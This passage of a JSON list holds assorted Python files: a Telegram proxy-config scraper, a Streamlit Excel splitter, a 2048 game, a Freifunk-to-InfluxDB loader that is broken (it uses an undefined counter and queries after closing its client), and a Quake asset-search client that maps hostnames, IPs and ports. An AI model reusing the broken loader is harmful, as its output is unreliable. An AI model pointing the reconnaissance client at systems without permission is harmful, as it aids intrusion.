base64.b64decode(config[8:]).decode(\"utf-8\")\n        except:\n            pass\n    if config.startswith('ssr://'):\n        try:\n            config = base64.b64decode(config[6:]).decode(\"utf-8\")\n        except:\n            pass\n    matches_usersname = re.findall(pattern_telegram_user, config, re.IGNORECASE)\n    try:\n        matches_usersname = re.findall(pattern_telegram_user, base64.b64decode(config).decode(\"utf-8\"), re.IGNORECASE)\n    except:\n        pass\n    \n    for index, element in enumerate(matches_usersname):\n        if element[0] != '':\n            tg_name.append(element[0].lower().encode('ascii', 'ignore').decode())\n        if element[1] != '':\n            tg_name.append(element[1].lower().encode('ascii', 'ignore').decode())\n        if element[2] != '':\n            tg_name.append(element[2].lower().encode('ascii', 'ignore').decode())             \n\ntg_name[:] = [x for x in tg_name if len(x) >= 5]\ntg_name_json[:] = [x for x in tg_name_json if len(x) >= 5]    \ntg_name = list(set(tg_name))\nprint(f'\\nFound tg channel names - {len(tg_name)}')\nprint(f'Total old names        - {len(tg_name_json)}')\ntg_name_json.extend(tg_name)\ntg_name_json = list(set(tg_name_json))\ntg_name_json = sorted(tg_name_json)\nprint(f'In the end, new names  - {len(tg_name_json)}')\n\nwith open('telegramchannels.json', 'w', encoding=\"utf-8\") as telegram_channels_file:\n    json.dump(tg_name_json, telegram_channels_file, indent = 4)\n\nprint(f'\\nSearch for new names is over - {str(datetime.now() - start_time).split(\".\")[0]}')\n\nprint(f'\\nStart Parsing...\\n')\n\ndef process(i_url):\n    sem_pars.acquire()\n    html_pages = list()\n    cur_url = i_url\n    god_tg_name = False\n    for itter in range(1, pars_dp+1):\n        while True:\n            try:\n                response = requests.get(f'https://t.me/s/{cur_url}')\n            except:\n                time.sleep(random.randint(5,25))\n                pass\n            else:\n                if itter == pars_dp:\n                    print(f'{tg_name_json.index(i_url)+1} of {walen} - {i_url}')\n                html_pages.append(response.text)\n                last_datbef = re.findall(pattern_datbef, response.text)\n                break\n        if not last_datbef:\n            break\n        cur_url = f'{i_url}?before={last_datbef[0]}'\n    for page in html_pages:\n        soup = BeautifulSoup(page, 'html.parser')\n        code_tags = soup.find_all(class_='tgme_widget_message_text')\n        for code_tag in code_tags:\n            code_content2 = str(code_tag).split('<br/>')\n            for code_content in code_content2:\n                if \"vles",
    "import pandas as pd\n# from zipfile import ZipFile\n# from io import BytesIO # for creating zip files\nimport io\nimport zipfile\nimport streamlit as st\n\n# setting download button color\nm = st.markdown(\"\"\"\n<style>\ndiv.stDownloadButton > button:first-child {\n    background-color: #3DED97;\n    color:#ffffff;\n}\ndiv.stDownloadButton > button:hover {\n    background-color: #3DED97;\n    color:#ffffff;\n    }\n</style>\"\"\", unsafe_allow_html=True)\n\n# setting sidebar width\nst.markdown(f'''\n    <style>\n        section[data-testid=\"stSidebar\"] .css-ng1t4o {{width: 14rem;}}\n        section[data-testid=\"stSidebar\"] .css-1d391kg {{width: 14rem;}}\n    </style>\n''',unsafe_allow_html=True)\n\n\ndef main ():\n    ##-- setting titles --##\n    # Title/Heading\n    st.title(\"Excel Row to Files Splitter\")\n    # Subheading\n    st.write(\"This website will help you split your Excel file equally into smaller files with the number of rows you want.\")\n    \n    \n    ##-- Step1: To upload and see the file you uploaded --##\n    st.sidebar.header(\"Step 1: Upload your file\")\n    df, upload_file_name = uploaded_file() # calling function\n    # df = \"\" # to avoiderror -> NameError: name 'df' is not defined\n    st.write(df)\n    \n    \n    ##-- Steps after files are uploaded --##\n    if df is not None: # so that it doesn't move on to step 2 if nothing is uploaded\n        ##-- Step2: To see the file that is uploaded --##\n        st.sidebar.header(\"Step 2: Set the number of rows to save in a file\")\n        \n        num_of_rows = int(st.sidebar.text_input(\"Number of rows you want in a file (press 'Enter' to apply):\", '200'))\n        num_of_files = len(df)//num_of_rows + 1\n        st.sidebar.write(\"After splitting, you will have\", num_of_files, \"files in total.\")\n        # call the row splitter function\n        row_splitter(num_of_rows)\n        \n        ##-- Step3: Typing the name you want for the saved files --##\n        st.sidebar.header(\"Step 3: Set the name of the splitted files\")\n        st.sidebar.write(\"This program will automatically add 'lines xxxx-xxxx' in the file name for you.\")\n        # file_name = st.sidebar.text_input(\"Name of these files (press 'Enter' to apply):\", \"example: CompanyX AppleSales Fuji_A 01012023\")\n        file_name = st.sidebar.text_input(\"Name of these files (press 'Enter' to apply):\", upload_file_name)\n        \n        ##-- Step4: Click Start Button To Start Downloading!! --##\n        # note: it is currently impossible to download multiple files at once through streamlit\n        # you can only pack the files you want to download into a zip folder and download the zip file\n        st.sidebar.header(\"Step 4: Start Downloading\")\n        st.sidebar.write('Click Start Button To Start Compiling.')\n        \n        # save all files into 1 ZIP file\n        zip_buffer = io.BytesIO() # create a .zip file in-memory without storing it to disk with io.BytesIO()\n        \n        # Adding multiple files to the zip\n        download_count = 0\n        # with zipfile.ZipFile(zip_buffer+\"/test.zip\", \"w\") as myzip: # TypeError: unsupported operand type(s) for +: '_io.BytesIO' and 'str'\n        with zipfile.ZipFile(zip_buffer, \"w\") as myzip:\n            for df_export_file in df_sliced:\n                # setting name with apendded values\n                export_file_name = file_name + \" lines \" + names_to_append[download_count] + \".xlsx\"\n                print(export_file_name)\n                # print(df_export_file.info())\n                # print(df_export_file)\n                print(download_count)\n                download_count +=1\n                # export files\n                with myzip.open(export_file_name, \"w\") as myfile:\n                    df_export_file.to_excel(myfile, index=False)\n        \n        # download button to download zip file\n        st.sidebar.download_button(\n            \"Download Excel Files\", \n            file_name=\"splitted_data.zip\", \n            mime=\"application/zip\", \n            data=zip_buffer\n        )\n        \n        ##-- Adding Additional White Spaces Under Download Button --##\n        st.sidebar.header(\"\")\n\n\n\n##-- Setup file upload accepting CSV and Excel --##\ndef uploaded_file():\n    # use the global keyword, the variable belongs to the global scope\n    global df # make the df global so other lines of code can read df\n    # valid = [\"csv\",\"xlsx\"] # to raise error for wrong file upload formats\n    \n    while True:\n        try: \n            uploaded_file = st.sidebar.file_uploader(label=\"Upload your Excel file here (one at a time)\", type=['xlsx'], accept_multiple_files=False, key='test')  # one file at a time!\n        except:\n            continue\n        else:\n            if uploaded_file is not None:\n                # print(uploaded_file)\n                # if type not in valid:\n                #     raise ValueError(\"results: status must be one of %r.\" % valid)\n                # elif type == \"csv\":\n                #     df = pd.read_csv(uploaded_file, index_col=None, dtype=str)\n                # else:\n             ",
    "from random import *\nfrom tkinter import *\nfrom tkinter.messagebox import *\n\ngame = Tk()  # \u57fa\u672c\u6846\u67b6\ngame.title('Game-2048')\ngame.geometry('305x205+500+250')\ngame.resizable(0, 0)\n\n\ndef base():\n    numdict = {1: {}, 2: {}, 3: {}, 4: {}}\n    for key in numdict.keys():\n        numdict[key] = {1: '', 2: '', 3: '', 4: ''}\n    while 1:\n        x1, x2, y1, y2 = randint(1, 4), randint(\n            1, 4), randint(1, 4), randint(1, 4)\n        if x1 != x2 or y1 != y2:\n            numdict[x1][y1], numdict[x2][y2] = 2, 2\n            break\n\n    frame = Frame(game, bg='#BBADA0').place(width=205, height=205)\n    frame2 = Frame(game, bg='orange').place(width=100, height=205, x=205)\n    frame3 = Frame(frame2, bg='#FAF8EF').place(\n        x=210, y=5, width=90, height=195)\n    (score := StringVar()).set('Score\\n\\n0')\n    (score_value := StringVar()).set('0')\n    Label(frame3, textvariable=score, font=('consolas', 15),\n          bg='yellow').place(x=215, y=10, width=80, height=100)\n    helpbutton = Button(frame2, text='Help', font=(\n        'consolas', 15), bd=0, bg='lightgreen', command=lambda: gamehelp())\n    helpbutton.place(x=215, y=160, width=80, height=30)\n    playbutton = Button(frame2, text='Play', font=(\n        'consolas', 15), bd=0, bg='lightgreen', command=lambda: gamestart())\n    playbutton.place(x=215, y=120, width=80, height=30)\n\n    n14 = StringVar()\n    n24 = StringVar()\n    n34 = StringVar()\n    n44 = StringVar()\n    n13 = StringVar()\n    n23 = StringVar()\n    n33 = StringVar()\n    n43 = StringVar()\n    n12 = StringVar()\n    n22 = StringVar()\n    n32 = StringVar()\n    n42 = StringVar()\n    n11 = StringVar()\n    n21 = StringVar()\n    n31 = StringVar()\n    n41 = StringVar()\n\n    for sy in [5, 55, 105, 155]:  # \u653e\u7f6e\u683c\u5b50\n        for sx, i in zip([5, 55, 105, 155], [n14, n24, n34, n44, n13, n23, n33, n43, n12, n22, n32, n42, n11, n21, n31, n41][4*(sy-5)//50:4*(sy+45)//50]):\n            Label(frame, bg='#CDC1B4', textvariable=i, font=(\n                'consolas', 15)).place(width=45, height=45, y=sy, x=sx)\n\n    def initialization():  # \u521d\u59cb\u5316\n        for x in range(1, 5):\n            for y, i in zip(range(1, 5), [n11, n12, n13, n14, n21, n22, n23, n24, n31, n32, n33, n34, n41, n42, n43, n44][4*(x-1):4*x]):\n                i.set(numdict[x][y])\n\n    def gamewin():  # \u6e38\u620f\u80dc\u5229\n        for value in numdict.values():\n            if 2048 in value:\n                frame_win = Frame(game, bg='yellow').place(\n                    width=305, height=205)\n                Label(frame_win, text='You Win!', font=('consolas', 30),\n                      fg='red', bg='yellow').place(width=305, height=60)\n                Button(frame_win, bd=0, bg='lightgreen', font=('consolas', 15), text='Again!',\n                       command=lambda: base()).place(width=80, height=30, y=150, x=45)\n                Button(frame_win, bd=0, bg='lightgreen', font=('consolas', 15), text='Quit!',\n                       command=lambda: quit()).place(width=80, height=30, y=150, x=180)\n                Label(frame, font=('consolas', 15), text='You have got to\\n2048!',\n                      bg='yellow').place(width=205, height=60, y=60, x=50)\n        game.after(100, gamewin)\n\n    def gameover():  # \u6e38\u620f\u7ed3\u675f\n        frame_over = Frame(game, bg='yellow').place(width=305, height=205)\n        Label(frame_over, text='Game Over!', font=('consolas', 30),\n              fg='red', bg='yellow').place(width=305, height=60)\n        Button(frame_over, bd=0, bg='lightgreen', font=('consolas', 15), text='Again!',\n               command=lambda: base()).place(width=80, height=30, y=150, x=45)\n        Button(frame_over, bd=0, bg='lightgreen', font=('consolas', 15), text='Quit!',\n               command=lambda: quit()).place(width=80, height=30, y=150, x=180)\n        Label(frame, font=('consolas', 50), textvariable=score_value,\n              bg='yellow').place(width=205, height=60, y=60, x=50)\n\n    def move(way, count=0):  # \u64cd\u4f5c\u51fd\u6570\n        if way in ['w', 's', 'a', 'd']:  # \u5224\u65ad\u662f\u5426\u4e3a\u6b63\u786e\u7684\u64cd\u4f5c\n\n            if way == 'w':\n                for x in range(1, 5):\n                    numdict[x][5] = 0\n                    for y in range(1, 5):\n                        if numdict[x][y] == numdict[x][y+1] and numdict[x][y] != '':\n                            numdict[x][y] = ''\n                            numdict[x][y+1] *= 2\n                        elif numdict[x][y] != '' and numdict[x][y+1] == '':\n                            numdict[x][y], numdict[x][y +\n                                                      1] = numdict[x][y+1], numdict[x][y]\n                    del numdict[x][5]\n            if way == 's':\n                for x in range(1, 5):\n                    numdict[x][0] = 0\n                    for y in range(4, 0, -1):\n                        if numdict[x][y] == numdict[x][y-1] and numdict[x][y] != '':\n                            numdict[x][y] = ''\n                            numdict[x][y-1] *= 2\n                        elif numdict[x][y] != '' and numdict[x][y-1] == '':\n                            numdict[x][y],",
    "import os\nimport json\nimport requests\nfrom dotenv import load_dotenv\nfrom influxdb_client import InfluxDBClient, Point, WritePrecision\nfrom influxdb_client.client.write_api import SYNCHRONOUS\n\n# Load environment variables from .env file\nload_dotenv()\n\n# Access environment variables\nurl = os.getenv('INFLUXDB_URL')\ntoken = os.getenv('INFLUXDB_TOKEN')\norg = os.getenv('INFLUXDB_ORG')\nbucket = os.getenv('INFLUXDB_BUCKET')\n\n# Create a client object\nclient = InfluxDBClient(url=url, token=token, org=org)\n\n# Get a write API instance\nwrite_api = client.write_api(write_options=SYNCHRONOUS)\n\n# URLs of the JSON data\nurls = [\n    \"https://api.freifunk.net/data/history/20240402-12.01.01-ffSummarizedDir.json\",\n    \"https://api.freifunk.net/data/history/20240402-13.01.01-ffSummarizedDir.json\",\n    \"https://api.freifunk.net/data/history/20240402-14.01.01-ffSummarizedDir.json\"\n]\n\n# Iterate over each URL\nfor url in urls:\n    # Fetch the JSON data from the URL\n    response = requests.get(url)\n\n    # Check if the request was successful\n    if response.status_code == 200:\n        data = response.json()\n        # Extract the date from the URL\n        date = url.split('/')[-1].split('-')[1]\n\n        # Iterate over the list of city objects\n        for city_name, city_data in data.items():\n            total_cities += 1 # Increment the total cities counter\n            # Check if 'city_data' is a dictionary and contains 'state' key\n            if isinstance(city_data, dict) and 'state' in city_data:\n                # Check if 'state' is a dictionary\n                if isinstance(city_data['state'], dict):\n                    # Check if 'state' contains 'nodes' key\n                    if 'nodes' in city_data['state']:\n                        point = Point(\"freifunk_nodes\").tag(\"city\", city_name).field(\"nodes\", city_data['state']['nodes']).time(date)\n                        write_api.write(bucket, org, point)\n                else:\n                    print(f\"Unexpected structure for city: {city_name}\")\n            else:\n                print(f\"Unexpected structure for city: {city_name}\")\n\n# Close the client\nclient.close()\n\n# Query data from InfluxDB using InfluxQL\nquery_api = client.query_api()\nquery = 'SELECT * FROM \"freifunk_nodes\" WHERE time >= now() - 1h'\nresult = query_api.query(query, org=org)\n\n# Print the query results\nfor table in result:\n    for record in table.records:\n        print(record.values)\n",
    "class PConv(nn.Module):\r\n    def __init__(self, dim, ouc, n_div=4, forward='split_cat'):\r\n        super().__init__()\r\n        self.dim_conv3 = dim // n_div\r\n        self.dim_untouched = dim - self.dim_conv3\r\n        self.partial_conv3 = nn.Conv2d(self.dim_conv3, self.dim_conv3, 3, 1, 1, bias=False)\r\n        self.conv = Conv(dim, ouc, k=1)\r\n\r\n        if forward == 'slicing':\r\n            self.forward = self.forward_slicing\r\n        elif forward == 'split_cat':\r\n            self.forward = self.forward_split_cat\r\n        else:\r\n            raise NotImplementedError\r\n\r\n    def forward_slicing(self, x):\r\n        # only for inference\r\n        x = x.clone()   # !!! Keep the original input intact for the residual connection later\r\n        x[:, :self.dim_conv3, :, :] = self.partial_conv3(x[:, :self.dim_conv3, :, :])\r\n        x = self.conv(x)\r\n        return x\r\n\r\n    def forward_split_cat(self, x):\r\n        # for training/inference\r\n        x1, x2 = torch.split(x, [self.dim_conv3, self.dim_untouched], dim=1)\r\n        x1 = self.partial_conv3(x1)\r\n        x = torch.cat((x1, x2), 1)\r\n        x = self.conv(x)\r\n        return x",
    "import argparse\r\nimport requests\r\nimport json\r\nimport pandas as pd\r\nimport os\r\nimport sqlite3\r\nfrom prettytable import PrettyTable\r\nimport dns.resolver\r\nfrom geopy.geocoders import Nominatim\r\n\r\n# \u5b9a\u4e49\u5e38\u91cf\u5217\u8868\uff0c\u5305\u542b\u5e38\u89c1\u7684CDN\u670d\u52a1\u5546\u540d\u79f0\r\nCOMMON_CDN_NAMES = [\"cloudflare\", \"akamai\", \"fastly\", \"maxcdn\", \"cloudfront\", \"azure cdn\", \"google cloud cdn\", \"stackpath\", \"limelight\", \"incapsula\"]  # \u6839\u636e\u9700\u8981\u6dfb\u52a0\u66f4\u591aCDN\u670d\u52a1\u5546\u540d\u79f0\r\n\r\nclass QuakeQuery:\r\n    def __init__(self, api_key):\r\n        self.api_key = api_key\r\n        self.conn = None\r\n        self.geolocator = Nominatim(user_agent=\"GUI_Enterprise_TI\")\r\n\r\n    def check_cdn_usage(self, hostname):\r\n        ipv4_addresses = []\r\n        resolver = dns.resolver.Resolver()\r\n        answers = resolver.resolve(hostname, 'A')\r\n\r\n        for answer in answers:\r\n            ipv4_addresses.append(answer.address)\r\n\r\n        return len(ipv4_addresses) >= 2\r\n\r\n    def connect_to_database(self, db_name=\"quake_results.db\"):\r\n        self.conn = sqlite3.connect(db_name)\r\n        self.cursor = self.conn.cursor()\r\n        self.create_table()\r\n\r\n    def create_table(self):\r\n        self.cursor.execute(\"\"\"\r\n            CREATE TABLE IF NOT EXISTS quake_results (\r\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n                hostname TEXT NOT NULL,\r\n                ip TEXT NOT NULL,\r\n                port INTEGER NOT NULL\r\n            )\r\n        \"\"\")\r\n        self.conn.commit()\r\n\r\n    def store_to_database(self, results):\r\n        insert_query = \"\"\"\r\n            INSERT INTO quake_results (hostname, ip, port) VALUES (?, ?, ?)\r\n        \"\"\"\r\n        rows_to_insert = [(item[\"service\"][\"http\"][\"host\"], item[\"ip\"], item[\"port\"]) for item in results]\r\n\r\n        self.cursor.executemany(insert_query, rows_to_insert)\r\n        self.conn.commit()\r\n\r\n    def perform_search(self, query, result_count, start_page):\r\n        headers = {\"X-QuakeToken\": self.api_key}\r\n        payload = {\r\n            \"query\": query,\r\n            \"start\": start_page,\r\n            \"size\": str(result_count),\r\n        }\r\n\r\n        try:\r\n            response = requests.post(\r\n                url=\"https://quake.360.cn/api/v3/search/quake_service\",\r\n                headers=headers,\r\n                json=payload,\r\n            )\r\n            response.raise_for_status()\r\n            return json.loads(response.text)\r\n        except requests.RequestException as e:\r\n            print(f\"API\u8bf7\u6c42\u8fc7\u7a0b\u4e2d\u53d1\u751f\u9519\u8bef: {e}\")\r\n            raise\r\n\r\n    def identify_cdn_provider(self, hostname):\r\n            url = f\"http://{hostname}\"\r\n            try:\r\n                response = requests.get(url, timeout=5)\r\n                response.raise_for_status()\r\n\r\n                server_header = response.headers.get(\"Server\", \"\").lower()\r\n                for cdn_name in COMMON_CDN_NAMES:\r\n                    if cdn_name.lower() in server_header:\r\n                        return cdn_name\r\n\r\n            except (requests.exceptions.RequestException, requests.exceptions.HTTPError):\r\n                pass\r\n            return None\r\n\r\n    def display_results(self, api_response, start_page, result_count, query_term):\r\n            print(\"\\n\")\r\n            print(f\"\u9875\u7801\uff1a\u7b2c{api_response['meta']['pagination']['page_index']}\u9875 \u5171\"\r\n                f\"{api_response['meta']['pagination']['page_size']}\u9875 \u603b\u6570\u91cf\uff1a\"\r\n                f\"{api_response['meta']['pagination']['total']}\u4e2a\")\r\n            print(f\"\u67e5\u8be2\u5185\u5bb9\uff1a{query_term}\")\r\n\r\n            table = PrettyTable([\"\u5e8f\u53f7\", \"\u5730\u5740\", \"IP\",  \"\u7aef\u53e3\",\"IP\u4f4d\u7f6e\", \"CDN\u670d\u52a1\u5546\"])\r\n\r\n            for index, item in enumerate(api_response[\"data\"], start=1):\r\n                if \"http\" in item[\"service\"]:\r\n                    hostname = item[\"service\"][\"http\"][\"host\"]\r\n\r\n                    if self.check_cdn_usage(hostname):\r\n                        cdn_provider = self.identify_cdn_provider(hostname)\r\n                    else:\r\n                        cdn_provider = \"\u672a\u77e5\"\r\n\r\n                    ip_address = item[\"ip\"]\r\n                    location = self.get_ip_location(ip_address)  # \u83b7\u53d6IP\u4f4d\u7f6e\u4fe1\u606f\r\n\r\n                    table.add_row([\r\n                        index,\r\n                        hostname,\r\n                        ip_address,\r\n                        item[\"port\"],\r\n                        location or \"\u672a\u77e5\",\r\n                        cdn_provider,\r\n                    ])\r\n                else:\r\n                    print(f\"\u8b66\u544a\uff1a\u7b2c{index}\u6761\u7ed3\u679c\u7684'service'\u7ed3\u6784\u4e2d\u7f3a\u5c11'http'\u5b50\u9879\uff0c\u8df3\u8fc7\u8be5\u6761\u8bb0\u5f55\u3002\")\r\n\r\n            print(table)\r\n\r\n    def get_ip_location(self, ip_address):\r\n        print(\"\u67e5\u8be2\u4e2d...\", end=\"\\r\")\r\n        location = self._get_ip_location_with_ip_api(ip_address)\r\n        if location is None:\r\n            location = self._get_ip_location_with_geopy(ip_address)\r\n        print(\" \" * 20, end=\"\\r\")  # \u6e05\u9664\u201c\u67e5\u8be2\u4e2d...\u201d\u5e76\u56de\u8f66\r\n        return location\r\n\r\n    def _get_ip_location_with_geopy(self, ip_address):\r\n        try:\r\n            location = self.geolocator.reverse(ip_address, language=\"zh-CN\")\r\n            return location.address\r\n        except Exception as e:\r\n            print(f\"\u4f7f\u7528geopy\u83b7\u53d6IP {ip_address} \u4f4d\u7f6e\u4fe1\u606f\u65f6\u53d1\u751f\u9519\u8bef: {e}\")\r\n            ",
    "import streamlit as st\r\nimport google.generativeai as genai\r\nimport os\r\nimport PyPDF2 as pdf\r\nfrom dotenv import load_dotenv\r\nimport time\r\n\r\nload_dotenv() ## load all our environment variables\r\n\r\ngenai.configure(api_key=os.getenv(\"GOOGLE_API_KEY\"))\r\n\r\n# function to instantiate model and get response\r\ndef get_gemini_response(input):\r\n    model = genai.GenerativeModel(\"gemini-pro\")\r\n    response = model.generate_content(input)\r\n    return response.text\r\n\r\n# function to extract text from pdf\r\ndef input_pdf_text(uploaded_file):\r\n    reader = pdf.PdfReader(uploaded_file)\r\n    text = \"\"\r\n    for page_n in range(len(reader.pages)):\r\n        page = reader.pages[page_n]\r\n        text += str(page.extract_text())\r\n    \r\n    return text\r\n\r\n# Prompt template\r\n\r\ninput_prompt = \"\"\"\r\nHey act like a skilled or very experienced ATS (Application Tracking System)\r\nwith a deep understanding of tech field, software engineering, data science, data analyst\r\nand bit data engineer. Your task is to evaluate the resume based on the given job description.\r\nYou must consider the job market is very competitive and you should provide best assistance\r\nfor improving the resumes. Assign the percentage matching based on JD (Job Description)\r\nand the missing keywords with high accuracy.\r\n\r\nI want the response in json structure like\r\n{\r\n    \"JD Match\": \"%\",\r\n    \"Missing Keywords\": [],\r\n    \"Profile Summary\": \"\"\r\n}\r\n\"\"\"\r\n\r\n# Streamlit app\r\nst.title(\"Smart Resume Tracking System\")\r\nst.subheader(\"Compare your Resume with Job Description\")\r\njd = st.text_area(\"Paste the Job Description\")\r\nuploaded_file = st.file_uploader(\"Upload your Resume\", type=\"pdf\", help=\"Please upload the pdf\")\r\n\r\nsubmit = st.button(\"Submit\")\r\n\r\nif submit:\r\n    if uploaded_file:\r\n        text = input_pdf_text(uploaded_file)\r\n        response=get_gemini_response([input_prompt, \"Job Description\\n\" + jd, \"Resume \\n\" + text])\r\n        bar = st.progress(50)\r\n        time.sleep(3)\r\n        bar.progress(100)\r\n        st.json(response)\r\n        \r\n",
    "import re\nimport csv\n\n\n# Remove all non-alphabetic characters from a string\ndef clean_text(text):\n    return re.sub(r\"[^a-zA-Z ]+\", \"\", text).strip()\n\n\n# Remove all non-numeric characters from a string\ndef clean_number(num_text):\n    return re.sub(r\"[^0-9]+\", \"\", num_text).strip()\n\n\ndef save_universities_to_csv(filename, universities):\n    with open(filename, \"w\", newline=\"\", encoding=\"utf-8\") as csvfile:\n        writer = csv.writer(csvfile)\n        writer.writerow(\n            [\n                \"University Rank\",\n                \"University Name\",\n                \"Professor Name\",\n                \"Home Page\",\n                \"Google Scholar\",\n            ]\n        )\n\n        for university in universities:\n            for professor in university.get(\"professors\", []):\n                writer.writerow(\n                    [\n                        university.get(\"rank\", \"\"),\n                        university.get(\"name\", \"\"),\n                        professor.get(\"name\", \"\"),\n                        professor.get(\"home_page\", \"\"),\n                        professor.get(\"google_scholar\", \"\"),\n                    ]\n                )\n\n\ndef load_universities_to_csv(filename, school_filter=None):\n    prof_items = []\n\n    with open(filename, \"r\", encoding=\"utf-8\") as csvfile:\n        reader = csv.DictReader(csvfile)\n        for row in reader:\n            if school_filter and row[\"University Name\"] not in school_filter:\n                continue\n\n            prof_items.append(\n                {\n                    \"school\": row[\"University Name\"],\n                    \"name\": row[\"Professor Name\"],\n                    \"home_page\": row[\"Home Page\"],\n                    \"google_scholar\": row[\"Google Scholar\"],\n                }\n            )\n\n    return prof_items\n\n\ndef save_relevant_professors_to_csv(filename, data):\n    with open(filename, \"w\", newline=\"\", encoding=\"utf-8\") as csvfile:\n        writer = csv.writer(csvfile)\n        writer.writerow(\n            [\n                \"University Name\",\n                \"Professor Name\",\n                \"Home Page\",\n                \"Google Scholar\",\n                \"Overall Relevance\",\n                \"Recent Relevant Highlights Count\",\n                \"Recent Relevant Highlights\",\n            ]\n        )\n\n        for prof in data:\n            writer.writerow(\n                [\n                    prof[\"school\"],\n                    prof[\"name\"],\n                    prof[\"home_page\"],\n                    prof[\"google_scholar\"],\n                    prof[\"relevance\"],\n                    prof[\"recent_highlights_num\"],\n                    prof[\"recent_highlights\"],\n                ]\n            )\n",
    "from lxml import etree\n\nclass OSCALCatalogParser:\n    def __init__(self):\n        pass  # Assuming schema validation is handled separately or not required for parsing\n\n    def parse(self, xml_data_path):\n        ns = {'oscal': 'http://csrc.nist.gov/ns/oscal/1.0'}\n        \n        try:\n            tree = etree.parse(xml_data_path)\n            root = tree.getroot()\n\n            catalog_id = root.attrib['uuid']\n            title = root.find('oscal:metadata/oscal:title', ns).text\n            \n            controls = root.findall('.//oscal:control', ns)\n            control_details = []\n            for control in controls:\n                control_id = control.get('id')\n                control_title = control.find('oscal:title', ns).text if control.find('oscal:title', ns) is not None else \"No Title\"\n                \n                # Assuming statements are contained within 'oscal:part' elements with a 'name' attribute of 'statement'\n                statements = control.findall(\"oscal:part[@name='statement']\", ns)\n                statement_texts = []\n                for statement in statements:\n                    # Each 'oscal:part' may contain multiple 'oscal:part' elements representing different statement items\n                    parts = statement.findall(\"oscal:part\", ns)\n                    for part in parts:\n                        if part.text:\n                            statement_texts.append(part.text.strip())\n                \n                control_details.append({\n                    'id': control_id,\n                    'title': control_title,\n                    'statements': statement_texts\n                })\n\n            return {\n                'catalog_id': catalog_id,\n                'title': title,\n                'controls': control_details\n            }\n        except Exception as e:\n            print(f\"Unexpected error: {e}\")\n            return None\n",
    "import random\r\nimport time\r\nimport matplotlib.pyplot as plt\r\nimport numpy as np\r\n\r\nclass color:\r\n    '''\r\n    You can choose bright or dark color. Moreover, you can pick color randomly.\r\n    '''\r\n    def __init__(self, number_color, random_seed=None, color_list=None) :\r\n\r\n        self.number_color = number_color\r\n\r\n        self.random_seed = random_seed\r\n\r\n        if color_list : \r\n            self.color_list = color_list \r\n        else : self.color_list = ['#0FC2C0', '#0CABA8', '#008F8C', '#015958', '#023535', # Green: from bright to dark\r\n                                  '#0087CC', '#007FBF', '#006EA6', '#00547F', '#002A40', # Blue: from bright to dark\r\n                                  '#FF5C4F', '#FF4237', '#FF241C', '#A90F0A', '#8B0200', # Red: from bright to dark\r\n                                  '#A8E6CF', '#DCEDC1', '#FFD3B6', '#FFAAA5', '#FF8B94', # Rainbow: from light blue to light red\r\n                                  '#FAACC4', '#F2CED8', '#D9B4BE', '#8C2641', '#732634', # LoveHeart: from light pink to dark pink\r\n                                  '#F2F2F2', '#D7D7D9', '#A19FA6', '#3C3840', '#89728C', # FrenchVintage: from light white to light purple\r\n                                  '#A68F97', '#79717A', '#4B4952', '#1F2024', '#004F4D', # Gremlins: drak colors\r\n                                  '#FAFCFB', '#F9D4C1', '#C0614B', '#733250', '#402129', # Luxury: from white to dark purple\r\n                                  '#EDFFC7', '#99D68F', '#C2F5A6', '#1E3B05', '#517D08', # FernandoVerde: from bright green to dark green\r\n                                  '#F8F7FF', '#836EFF', '#2C15B0', '#2A1F69', '#1B1733', # Website: from white to dark blue and purple\r\n                                  '#DCDCDC', '#A0A0A0', '#646464', '#323232', '#101010', # Shades: from white to black\r\n                                  '#F2E3D5', '#D0B4A7', '#8B6C59', '#A16564', '#623637', # StrongWing: from blown to dark blown\r\n                                  '#ECFFCB', '#FCCCA4', '#FF6A53', '#DD1805', '#B11000', # Autum: from light yellow to dark red\r\n                                  '#D9AD5B', '#A66F2D', '#593202', '#011526', '#0D0D0D', # Luxury1: from light blown to black\r\n                                  '#F2E9BB', '#F19C28', '#EE8228', '#DB5B1C', '#EC5B26', # OrangeBox: from light to dark orange\r\n                                  '#F2C641', '#F2BB16', '#F2A007', '#F28705', '#594011'] # Yellow: from bright to dark\r\n            \r\n    def select_seed(self) :\r\n\r\n        self.random_seed = int(time.time())\r\n\r\n        return self.random_seed \r\n\r\n    def random_select_color(self) :\r\n\r\n        if not self.random_seed :\r\n            self.random_seed = self.select_seed()\r\n\r\n        random.seed(self.random_seed)\r\n\r\n        selected_color = random.sample(self.color_list, self.number_color)\r\n\r\n        return selected_color, self.random_seed\r\n    \r\n    def get_green(self) :\r\n        return self.color_list[0:5]   \r\n    def get_blue(self) :\r\n        return self.color_list[5:10]\r\n    def get_red(self) :\r\n        return self.color_list[10:15]\r\n    def get_orange(self) :\r\n        return self.color_list[70:75]\r\n    def get_yellow(self) :\r\n        return self.color_list[75:80]\r\n    def get_all_color(self) :\r\n        return self.color_list\r\n    def gradient_color(self, level) :\r\n        # There are five levels about color: level 1 to level5(bright -> dark)\r\n        if level == 1 :\r\n            color = self.color_list[0::5]\r\n        elif level == 2 :\r\n            color = self.color_list[1::5]\r\n        elif level == 3 :\r\n            color = self.color_list[2::5]\r\n        elif level == 4 :\r\n            color = self.color_list[3::5]\r\n        elif level == 5 :\r\n            color = self.color_list[4::5]\r\n        return color\r\n    \r\n    def show_color(self, show_color_list) :\r\n        \r\n        plt.figure(figsize=(12, 8))\r\n\r\n        for i, color in enumerate(show_color_list):\r\n            plt.bar(i, 1, color=color)\r\n\r\n        plt.xticks(np.arange(len(show_color_list)))\r\n        plt.yticks([])\r\n        plt.title('Custom Color Palette')\r\n        plt.show()\r\n\r\n    \r\n\r\n    \r\n# Initialize the class by specifying the number of colors you want to generate. \r\n# The second parameter is the random seed. If the seed is not provided, a seed will be automatically generated and can be retrieved after the code runs. \r\nc = color(3, 17) \r\nrandom_color, random_seed = c.random_select_color() # Get random colors and seed\r\nlevel_color = c.gradient_color(1) # Find bright or dark color by level (1-5, bright -> drak)\r\nall_color = c.get_all_color()\r\nprint(random_color, random_seed)\r\nprint(c.show_color(all_color)) # Show color\r\n\r\n\r\n",
